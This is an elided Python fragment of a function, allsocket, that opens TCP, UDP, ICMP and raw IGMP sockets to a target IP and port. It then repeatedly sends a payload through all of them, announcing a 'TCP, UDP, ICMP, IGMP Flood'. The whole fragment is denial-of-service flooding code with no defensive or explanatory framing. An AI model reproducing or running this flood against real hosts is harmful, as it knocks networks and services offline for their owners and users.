...
def allsocket():
    try:
        ...
        igmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IGMP)
        ...
        icmp_socket.connect((ip, port))
        igmp_socket.connect((ip, port))

        print(f"Sending Packets to > ip : {ip} port : {port} | with time => {times} with Method TCP, UDP, ICMP, IGMP Flood ")
        
        # Send packets
        for _ in range(times):
            tcp_socket.send(grtools)
            udp_socket.sendto(grtools, (ip, port))
            icmp_socket.sendto(grtools, (ip, port))
            igmp_socket.sendto(grtools, (ip, port))
